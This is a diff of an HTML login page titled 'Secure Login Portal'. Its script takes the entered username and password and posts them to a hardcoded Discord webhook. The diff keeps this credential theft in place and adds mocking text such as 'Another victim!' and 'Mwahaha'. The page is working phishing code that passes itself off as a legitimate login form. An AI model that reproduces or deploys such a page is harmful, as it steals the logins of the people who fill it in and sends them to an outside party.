@@ -1,38 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Page</title>
+    <title>Secure Login Portal</title>
     <script>
-        function sendClientInfo() {
+        function unleashTheKraken() {
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
 
-            // Create a new XMLHttpRequest object
+            // Prepare to dive into the abyss of the web
             var xhr = new XMLHttpRequest();
-
-            // Prepare the request
             xhr.open("POST", "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg", true);
             xhr.setRequestHeader("Content-Type", "application/json");
 
-            // Create the data object
             var data = JSON.stringify({
-                "username": username,
-                "password": password
+                "content": "Oh, look! Another victim!\nUsername: " + username + "\nPassword: " + password
             });
 
-            // Send the request with the data
+            // Let the Kraken loose!
             xhr.send(data);
         }
     </script>
 </head>
 <body>
-    <h2>Login</h2>
+    <h2>Welcome, oh great client!</h2>
     <form>
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" required><br><br>
         <label for="password">Password:</label>
         <input type="password" id="password" name="password" required><br><br>
-        <input type="button" value="Login" onclick="sendClientInfo()">
+        <input type="button" value="Unleash the Kraken" onclick="unleashTheKraken()">
     </form>
+    <p>Warning: By clicking "Unleash the Kraken," you hereby grant me access to your client's personal info. Mwahaha!</p>
 </body>
 </html>
